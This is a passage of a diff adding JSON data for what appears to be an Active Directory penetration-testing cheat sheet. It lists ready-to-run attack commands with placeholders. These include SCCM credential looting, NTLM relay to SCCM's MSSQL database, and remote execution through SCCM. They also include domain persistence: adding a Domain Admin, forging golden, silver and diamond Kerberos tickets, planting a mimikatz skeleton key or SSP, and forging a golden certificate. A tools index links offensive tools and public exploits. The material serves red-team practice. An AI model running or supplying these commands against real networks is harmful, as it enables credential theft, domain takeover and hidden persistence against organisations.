+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "CRED-6 Loot creds",
+     "flows": [
+      [
+       "User + Pass"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "SCCM SMB service (445/TCP) on a DP",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "cmloot.py <domain>/<user>:<password>@<sccm_dp> -cmlootinventory sccmfiles.txt",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "SCCM HTTP service (80/TCP or 443/TCP) on a DP",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "SCCMSecrets.py policies -mp http://<management_point> -u '<machine_account>$' -p '<machine_password>' -cn '<client_name>'",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "SCCMSecrets.py files -dp http://<distribution_point> -u '<user>' -p '<password>'",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "sccm-http-looter -server <ip_dp>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Takeover-1:relay to mssql db Simple user",
+     "flows": [
+      [
+       "SCCM ADMIN"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "SCCM MSSQL != SSCM server",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "sccmhunter.py mssql -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug -tu <target_user> -sc <site_code> -stacked",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "ntlmrelayx.py -smb2support -ts -t mssql://<sccm_mssql> -q \"<query>\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": false,
+       "t": "coerce sccm_mssql -> attacker",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": true,
+       "t": "sccmhunter.py admin -u <target_user>@<domain> -p '<password>' -ip <sccm_ip>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Takeover-2:relay to mssql server Simple user",
+     "flows": [
+      [
+       "Admin MSSQL"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "SCCM MSSQL != SSCM server",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "ntlmrelayx.py -t <sccm_mssql> -smb2support -socks",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "coerce sccm_server",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "proxychains smbexec.py -no-pass <domain>/'<sccm_server>$'@<sccm_ip>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Creds-2:Policy Request Credentials Simple user",
+     "flows": [
+      [
+       "User + Pass"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "add computer",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "sccmwtf.py newcomputer newcomputer.<domain> <target> '<domain>\\<computer_added>$' '<computer_pass>'",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "get NetworkAccessUsername and NetworkAccessPassword",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "policysecretunobfuscate.py",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": false,
+       "t": "delete device created after sccmadmin",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "SharpSCCM.exe get secrets -r newcomputer -u <computer_added>$ -p <computer_pass>\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "cleanup",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Creds-3Creds-4 Computer Admin user",
+     "flows": [
+      [
+       "NAA credentials"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "dploot.py sccm -u <admin> -p '<password>' <sccm_target>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "sccmhunter.py dpapi  -u <admin> -p '<password>' -target <sccm_target> -debug",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "SharpSCCM.exe local secrets -m disk",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "SharpSCCM.exe local secrets -m wmi",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Creds-5 SCCM admin",
+     "flows": [
+      [
+       "Site DB credentials"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "secretsdump.py <domain>/<admin>:'<pass>'@<sccm_target>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "mssqlclient.py -windows-auth -hashes '<sccm_target_hashNT>' '<domain>/<sccm_target>$'@<sccm_mssql>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "use CM_<site_code>;",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "SELECT * FROM SC_UserAccount;",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": true,
+       "t": "sccmdecryptpoc.exe <cyphered_value>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "EXEC-1/2 SCCM admin",
+     "flows": [
+      [
+       "lat"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "SharpSCCM.exe exec -p <binary> -d <device_name> -sms <SMS_PROVIDER> -sc <SITECODE> --no-banner",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "sccmhunter.py admin -u <user>@<domain> -p '<password>' -ip <sccm_ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "get_device <hostname>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "interact <device_id>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": true,
+       "t": "script xploit.ps1",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Cleanup",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "SharpSCCM.exe get devices -sms <SMS_PROVIDER> -sc <SITECODE> -n <NTLMRELAYX_LISTENER_IP> -p \"Name\" -p \"ResourceId\" -p \"SMSUniqueIdentifier\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "SharpSCCM.exe remove device GUID:<GUID> -sms <SMS_PROVIDER> -sc <SITECODE>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Post exploit",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "as sccm admin",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "SCCMHound.exe --server <server> --sitecode <sitecode>`",
+       "cve": false,
+       "flow": "Users sessions"
+      }
+     ]
+    }
+   ]
+  },
+  "persistence": {
+   "title": "Persistence",
+   "subjects": [
+    {
+     "title": "ADD DA",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "net group \"domain admins\" myuser /add /domain",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Golden ticket",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "ticketer.py -aesKey <aeskey> -domain-sid <domain_sid> -domain <domain> <anyuser>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "mimikatz \"kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid>/aes256:<krbtgt_aes256> /ptt\"",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Silver Ticket",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "mimikatz \"kerberos::golden /sid:<current_user_sid> /domain:<domain-sid> /target:<target_server> /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "ticketer.py -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> <anyuser>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Directory Service Restore Mode (DSRM)",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "PowerShell New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehavior\" -Value 2 -PropertyType DWORD",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Skeleton Key",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "mimikatz \"privilege::debug\" \"misc::skeleton\" \"exit\" #password is mimikatz",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Custom SSP",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "mimikatz \"privilege::debug\" \"misc::memssp\" \"exit\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "C:\\Windows\\System32\\kiwissp.log",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Golden certificate",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "certipy ca -backup -ca '<ca_name>' -username <user>@<domain> -hashes <hash>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certipy forge -ca-pfx <ca_private_key> -upn <user>@<domain> -subject 'CN=<user>,CN=Users,DC=<CORP>,DC=<LOCAL>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Diamond ticket",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "ticketer.py -request -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid>  -user-id <user_id> -groups '512,513,518,519,520' <anyuser>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Saphire Ticket",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "ticketer.py -request -impersonate <anyuser> -domain <domain> -user <user> -password <password>  -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid>  'ignored'",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "DC shadow",
+     "flows": [],
+     "items": []
+    },
+    {
+     "title": "ACL manipulation",
+     "flows": [],
+     "items": []
+    },
+    {
+     "title": "...",
+     "flows": [],
+     "items": []
+    }
+   ]
+  }
+ },
+ "tools": {
+  "nslookup": {
+   "icon": null,
+   "link": "https://linux.die.net/man/1/nslookup",
+   "used_in": [
+    "no_creds"
+   ]
+  },
+  "tftp": {
+   "icon": null,
+   "link": "https://linux.die.net/man/1/tftp",
+   "used_in": [
+    "no_creds"
+   ]
+  },
+  "nmcli": {
+   "icon": null,
+   "link": "https://linux.die.net/man/1/nmcli",
+   "used_in": [
+    "no_creds"
+   ]
+  },
+  "dig": {
+   "icon": null,
+   "link": "https://linux.die.net/man/1/dig",
+   "used_in": [
+    "no_creds"
+   ]
+  },
+  "smbclient": {
+   "icon": null,
+   "link": "https://linux.die.net/man/1/smbclient",
+   "used_in": [
+    "no_creds"
+   ]
+  },
+  "ldapsearch": {
+   "icon": null,
+   "link": "https://linux.die.net/man/1/ldapsearch",
+   "used_in": [
+    "no_creds"
+   ]
+  },
+  "nxc": {
+   "icon": "nxc",
+   "link": "https://github.com/Pennyw0rth/NetExec",
+   "used_in": [
+    "no_creds",
+    "valid_user",
+    "authenticated",
+    "admin",
+    "dom_admin",
+    "mitm",
+    "know_vuln_auth",
+    "lat_move",
+    "acl",
+    "sccm"
+   ]
+  },
+  "nmap": {
+   "icon": "nmap",
+   "link": "https://github.com/nmap/nmap",
+   "used_in": [
+    "no_creds"
+   ]
+  },
+  "Get-ADDefaultDomainPasswordPolicy": {
+   "icon": "ps1",
+   "link": "https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy",
+   "used_in": [
+    "valid_user"
+   ]
+  },
+  "ldeep": {
+   "icon": "github",
+   "link": "https://github.com/franc-pentest/ldeep",
+   "used_in": [
+    "valid_user",
+    "authenticated",
+    "adcs",
+    "trusts",
+    "acl",
+    "sccm"
+   ]
+  },
+  "ldapsearch-ad.py": {
+   "icon": "github",
+   "link": "https://github.com/yaap7/ldapsearch-ad",
+   "used_in": [
+    "valid_user",
+    "authenticated"
+   ]
+  },
+  "Get-ADFineGainedPasswordPolicy": {
+   "icon": "ps1",
+   "link": "https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adfinegrainedpasswordpolicy",
+   "used_in": [
+    "valid_user"
+   ]
+  },
+  "sprayhound": {
+   "icon": "github",
+   "link": "https://github.com/Hackndo/sprayhound",
+   "used_in": [
+    "valid_user"
+   ]
+  },
+  "kerbrute": {
+   "icon": "github",
+   "link": "https://github.com/ropnop/kerbrute",
+   "used_in": [
+    "no_creds",
+    "valid_user"
+   ]
+  },
+  "MATCH": {
+   "icon": "bloodhound",
+   "link": "https://github.com/SpecterOps/BloodHound",
+   "used_in": [
+    "valid_user",
+    "authenticated",
+    "delegation",
+    "lat_move",
+    "trusts",
+    "acl"
+   ]
+  },
+  "GetNPUsers.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py",
+   "used_in": [
+    "valid_user"
+   ]
+  },
+  "Rubeus.exe": {
+   "icon": "rubeus",
+   "link": "https://github.com/GhostPack/Rubeus",
+   "used_in": [
+    "valid_user",
+    "authenticated",
+    "delegation",
+    "adcs",
+    "lat_move"
+   ]
+  },
+  "GetUserSPNs.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py",
+   "used_in": [
+    "valid_user",
+    "authenticated"
+   ]
+  },
+  "CVE-2022-33679.py": {
+   "icon": "github",
+   "link": "https://github.com/Bdenneu/CVE-2022-33679",
+   "used_in": [
+    "valid_user"
+   ]
+  },
+  "enum4linux-ng.py": {
+   "icon": "github",
+   "link": "https://github.com/cddmp/enum4linux-ng",
+   "used_in": [
+    "no_creds"
+   ]
+  },
+  "pxethief.py": {
+   "icon": "github",
+   "link": "https://github.com/MWR-CyberSec/PXEThief",
+   "used_in": [
+    "no_creds"
+   ]
+  },
+  "timeroast.py": {
+   "icon": "github",
+   "link": "https://github.com/SecuraBV/Timeroast",
+   "used_in": [
+    "no_creds"
+   ]
+  },
+  "mitm6": {
+   "icon": "github",
+   "link": "https://github.com/dirkjanm/mitm6",
+   "used_in": [
+    "no_creds"
+   ]
+  },
+  "petitpotam.py": {
+   "icon": "github",
+   "link": "https://github.com/topotam/PetitPotam",
+   "used_in": [
+    "no_creds",
+    "authenticated",
+    "low_access"
+   ]
+  },
+  "bettercap": {
+   "icon": "bettercap",
+   "link": "https://www.bettercap.org/",
+   "used_in": [
+    "no_creds"
+   ]
+  },
+  "responder": {
+   "icon": "github",
+   "link": "https://github.com/lgandx/Responder",
+   "used_in": [
+    "no_creds",
+    "mitm"
+   ]
+  },
+  "hashcat": {
+   "icon": "hashcat",
+   "link": "https://hashcat.net/hashcat/",
+   "used_in": [
+    "valid_user",
+    "crack_hash"
+   ]
+  },
+  "john": {
+   "icon": "john",
+   "link": "https://github.com/openwall/john",
+   "used_in": [
+    "crack_hash"
+   ]
+  },
+  "findDelegation.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/findDelegation.py",
+   "used_in": [
+    "delegation"
+   ]
+  },
+  "sccmwtf.py": {
+   "icon": "github",
+   "link": "https://github.com/xpn/sccmwtf/tree/main",
+   "used_in": [
+    "sccm"
+   ]
+  },
+  "mimikatz": {
+   "icon": "mimikatz",
+   "link": "https://github.com/gentilkiwi/mimikatz",
+   "used_in": [
+    "delegation",
+    "admin",
+    "dom_admin",
+    "lat_move",
+    "trusts",
+    "acl",
+    "persistence"
+   ]
+  },
+  "secretsdump.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/secretsdump.py",
+   "used_in": [
+    "admin",
+    "dom_admin",
+    "lat_move",
+    "trusts",
+    "acl",
+    "sccm"
+   ]
+  },
+  "certipy": {
+   "icon": "github",
+   "link": "https://github.com/ly4k/Certipy",
+   "used_in": [
+    "authenticated",
+    "know_vuln_auth",
+    "adcs",
+    "lat_move",
+    "acl",
+    "persistence"
+   ]
+  },
+  "pywhisker.py": {
+   "icon": "github",
+   "link": "https://github.com/ShutdownRepo/pywhisker",
+   "used_in": [
+    "acl"
+   ]
+  },
+  "targetedKerberoast.py": {
+   "icon": "github",
+   "link": "https://github.com/ShutdownRepo/targetedKerberoast",
+   "used_in": [
+    "acl"
+   ]
+  },
+  "gMSADumper.py": {
+   "icon": "github",
+   "link": "https://github.com/micahvandeusen/gMSADumper",
+   "used_in": [
+    "acl"
+   ]
+  },
+  "Get-DomainObjectAcl": {
+   "icon": "ps1",
+   "link": "https://github.com/PowerShellMafia/PowerSploit",
+   "used_in": [
+    "acl"
+   ]
+  },
+  "Get-DomainOU": {
+   "icon": "ps1",
+   "link": "https://github.com/PowerShellMafia/PowerSploit",
+   "used_in": [
+    "acl"
+   ]
+  },
+  "certutil": {
+   "icon": "microsoft",
+   "link": "https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/certutil",
+   "used_in": [
+    "adcs"
+   ]
+  },
+  "certify": {
+   "icon": "github",
+   "link": "https://github.com/GhostPack/Certify",
+   "used_in": []
+  },
+  "ntlmrelayx.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",
+   "used_in": [
+    "mitm",
+    "adcs",
+    "sccm"
+   ]
+  },
+  "gettgtpkinit.py": {
+   "icon": "github",
+   "link": "https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py",
+   "used_in": [
+    "adcs",
+    "lat_move"
+   ]
+  },
+  "smbclient.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/smbclient.py",
+   "used_in": [
+    "mitm",
+    "lat_move"
+   ]
+  },
+  "msf>": {
+   "icon": "metasploit",
+   "link": "https://docs.metasploit.com/",
+   "used_in": [
+    "admin",
+    "dom_admin",
+    "low_hanging",
+    "mitm",
+    "know_vuln_auth",
+    "acl"
+   ]
+  },
+  "GetADUsers.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/GetADUsers.py",
+   "used_in": [
+    "authenticated"
+   ]
+  },
+  "manspider": {
+   "icon": "github",
+   "link": "https://github.com/blacklanternsecurity/MANSPIDER",
+   "used_in": [
+    "authenticated"
+   ]
+  },
+  "bloodhound-python": {
+   "icon": "github",
+   "link": "https://github.com/dirkjanm/BloodHound.py",
+   "used_in": [
+    "authenticated"
+   ]
+  },
+  "rusthound": {
+   "icon": "rusthound",
+   "link": "https://github.com/NH-RED-TEAM/RustHound",
+   "used_in": [
+    "authenticated"
+   ]
+  },
+  "rusthound-ce": {
+   "icon": "rusthoundce",
+   "link": "https://github.com/g0h4n/RustHound-CE",
+   "used_in": [
+    "authenticated"
+   ]
+  },
+  "sharphound.exe": {
+   "icon": "bloodhound",
+   "link": "https://github.com/SpecterOps/SharpHound",
+   "used_in": [
+    "authenticated",
+    "trusts"
+   ]
+  },
+  "ldapdomaindump.py": {
+   "icon": "github",
+   "link": "https://github.com/dirkjanm/ldapdomaindump",
+   "used_in": [
+    "authenticated"
+   ]
+  },
+  "adidnsdump": {
+   "icon": "github",
+   "link": "https://github.com/dirkjanm/adidnsdump",
+   "used_in": [
+    "authenticated"
+   ]
+  },
+  "AD-miner": {
+   "icon": "adminer",
+   "link": "https://github.com/AD-Security/AD_Miner",
+   "used_in": [
+    "authenticated"
+   ]
+  },
+  "Ping-Castle.exe": {
+   "icon": "ps1",
+   "link": "https://www.pingcastle.com/download/",
+   "used_in": []
+  },
+  "Import-Module": {
+   "icon": "ps1",
+   "link": null,
+   "used_in": [
+    "authenticated"
+   ]
+  },
+  "ntlm_theft.py": {
+   "icon": "github",
+   "link": "https://github.com/Greenwolf/ntlm_theft",
+   "used_in": [
+    "authenticated"
+   ]
+  },
+  "dnstool.py": {
+   "icon": "github",
+   "link": "https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py",
+   "used_in": [
+    "authenticated",
+    "low_access",
+    "sccm"
+   ]
+  },
+  "printerbug.py": {
+   "icon": "github",
+   "link": "https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py",
+   "used_in": [
+    "authenticated"
+   ]
+  },
+  "coercer.py": {
+   "icon": "coercer",
+   "link": "https://github.com/p0dalirius/Coercer",
+   "used_in": [
+    "authenticated"
+   ]
+  },
+  "installutil.exe": {
+   "icon": "microsoft",
+   "link": "https://lolbas-project.github.io/lolbas/Binaries/Installutil/",
+   "used_in": [
+    "low_access"
+   ]
+  },
+  "MsBuild.exe": {
+   "icon": "microsoft",
+   "link": "https://lolbas-project.github.io/lolbas/Binaries/Msbuild/",
+   "used_in": [
+    "low_access"
+   ]
+  },
+  "msdt.exe": {
+   "icon": "microsoft",
+   "link": "https://lolbas-project.github.io/lolbas/Binaries/Msdt/",
+   "used_in": [
+    "low_access"
+   ]
+  },
+  "wsreset.exe": {
+   "icon": "microsoft",
+   "link": "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/",
+   "used_in": [
+    "low_access"
+   ]
+  },
+  "winPEASany_ofs.exe": {
+   "icon": "winpeas",
+   "link": "https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md",
+   "used_in": [
+    "low_access"
+   ]
+  },
+  "KrbRelayUp.exe": {
+   "icon": "github",
+   "link": "https://github.com/Dec0ne/KrbRelayUp",
+   "used_in": [
+    "low_access"
+   ]
+  },
+  "findSMB2UPTime.py": {
+   "icon": "github",
+   "link": "https://github.com/SpiderLabs/Responder/blob/master/tools/FindSMB2UPTime.py",
+   "used_in": [
+    "know_vuln_auth"
+   ]
+  },
+  "ms14-068.py": {
+   "icon": "github",
+   "link": "https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-068/pykek/ms14-068.py",
+   "used_in": [
+    "know_vuln_auth"
+   ]
+  },
+  "goldenPac.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/goldenPac.py",
+   "used_in": [
+    "know_vuln_auth"
+   ]
+  },
+  "Get-GPPPassword.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/Get-GPPPassword.py",
+   "used_in": [
+    "know_vuln_auth"
+   ]
+  },
+  "privexchange.py": {
+   "icon": "github",
+   "link": "https://github.com/dirkjanm/PrivExchange",
+   "used_in": [
+    "know_vuln_auth"
+   ]
+  },
+  "noPac.exe": {
+   "icon": "github",
+   "link": "https://github.com/cube0x0/noPac",
+   "used_in": [
+    "know_vuln_auth"
+   ]
+  },
+  "printnightmare.py": {
+   "icon": "github",
+   "link": "https://github.com/ly4k/PrintNightmare/blob/main/printnightmare.py",
+   "used_in": [
+    "know_vuln_auth"
+   ]
+  },
+  "dnscmd.exe": {
+   "icon": "microsoft",
+   "link": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd",
+   "used_in": [
+    "acl"
+   ]
+  },
+  "sc": {
+   "icon": "microsoft",
+   "link": "https://learn.microsoft.com/en-us/windows/win32/services/controlling-a-service-using-sc",
+   "used_in": [
+    "acl"
+   ]
+  },
+  "Get-LapsADPassword": {
+   "icon": "ps1",
+   "link": "https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword?view=windowsserver2025-ps",
+   "used_in": [
+    "acl"
+   ]
+  },
+  "zerologon-scan": {
+   "icon": "github",
+   "link": "https://github.com/SecuraBV/CVE-2020-1472",
+   "used_in": [
+    "low_hanging"
+   ]
+  },
+  "cve-2020-1472-exploit.py": {
+   "icon": "github",
+   "link": "https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py",
+   "used_in": [
+    "low_hanging"
+   ]
+  },
+  "getST.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/getST.py",
+   "used_in": [
+    "delegation"
+   ]
+  },
+  "getTGT.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/getTGT.py",
+   "used_in": [
+    "delegation",
+    "lat_move"
+   ]
+  },
+  "addcomputer.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/addcomputer.py",
+   "used_in": [
+    "delegation"
+   ]
+  },
+  "reg.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/reg.py",
+   "used_in": [
+    "admin",
+    "lat_move"
+   ]
+  },
+  "rbcd.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/rbcd.py",
+   "used_in": [
+    "delegation"
+   ]
+  },
+  "mssqlclient.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py",
+   "used_in": [
+    "lat_move",
+    "trusts",
+    "sccm"
+   ]
+  },
+  "dcomexec.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/dcomexec.py",
+   "used_in": [
+    "lat_move"
+   ]
+  },
+  "ticketConverter.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py",
+   "used_in": [
+    "lat_move"
+   ]
+  },
+  "tgssub.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/pull/1256",
+   "used_in": [
+    "lat_move"
+   ]
+  },
+  "certify.exe": {
+   "icon": "github",
+   "link": "https://github.com/GhostPack/Certify",
+   "used_in": [
+    "authenticated",
+    "adcs"
+   ]
+  },
+  "sccmhunter.py": {
+   "icon": "sccmhunter",
+   "link": "https://github.com/garrettfoster13/sccmhunter",
+   "used_in": [
+    "authenticated",
+    "sccm"
+   ]
+  },
+  "SharpSCCM.exe": {
+   "icon": "sharpsccm",
+   "link": "https://github.com/Mayyhem/SharpSCCM",
+   "used_in": [
+    "authenticated",
+    "sccm"
+   ]
+  },
+  "dploot.py": {
+   "icon": "github",
+   "link": "https://github.com/zblurx/dploot",
+   "used_in": [
+    "admin",
+    "sccm"
+   ]
+  },
+  "SCCMSecrets.py": {
+   "icon": "github",
+   "link": "https://github.com/synacktiv/SCCMSecrets",
+   "used_in": [
+    "sccm"
+   ]
+  },
+  "sccm-http-looter": {
+   "icon": "github",
+   "link": "https://github.com/badsectorlabs/sccm-http-looter",
+   "used_in": [
+    "sccm"
+   ]
+  },
+  "ticketer.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/ticketer.py",
+   "used_in": [
+    "trusts",
+    "persistence"
+   ]
+  },
+  "raiseChild.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/raiseChild.py",
+   "used_in": [
+    "trusts"
+   ]
+  },
+  "lookupsid.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/lookupsid.py",
+   "used_in": [
+    "lat_move",
+    "trusts"
+   ]
+  },
+  "donpapi": {
+   "icon": "donpapi",
+   "link": "https://github.com/login-securite/DonPAPI",
+   "used_in": [
+    "admin",
+    "dom_admin"
+   ]
+  },
+  "psexec.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/psexec.py",
+   "used_in": [
+    "lat_move"
+   ]
+  },
+  "atexec.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/atexec.py",
+   "used_in": [
+    "lat_move"
+   ]
+  },
+  "smbexec.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/smbexec.py",
+   "used_in": [
+    "lat_move",
+    "sccm"
+   ]
+  },
+  "wmiexec.py": {
+   "icon": "impacket",
+   "link": "https://github.com/fortra/impacket/blob/master/examples/wmiexec.py",
+   "used_in": [
+    "lat_move"
+   ]
+  },
+  "evil-winrm": {
+   "icon": "evilwinrm",
+   "link": "https://github.com/Hackplayers/evil-winrm",
+   "used_in": [
+    "lat_move"
+   ]
+  },
+  "cmloot.py": {
+   "icon": "github",
+   "link": "https://github.com/shelltrail/cmloot/tree/main",
+   "used_in": [
+    "sccm"
+   ]
+  },
+  "ysoserial.jar": {
+   "icon": "ysoserial",
+   "link": "https://github.com/frohoff/ysoserial",
+   "used_in": [
+    "low_hanging"
+   ]
+  },
+  "PingCastle.exe": {
+   "icon": "pingcastle",
+   "link": "https://www.pingcastle.com/",
+   "used_in": [
+    "authenticated"
+   ]
+  },
+  "Get-ChildItem": {
+   "icon": "ps1",
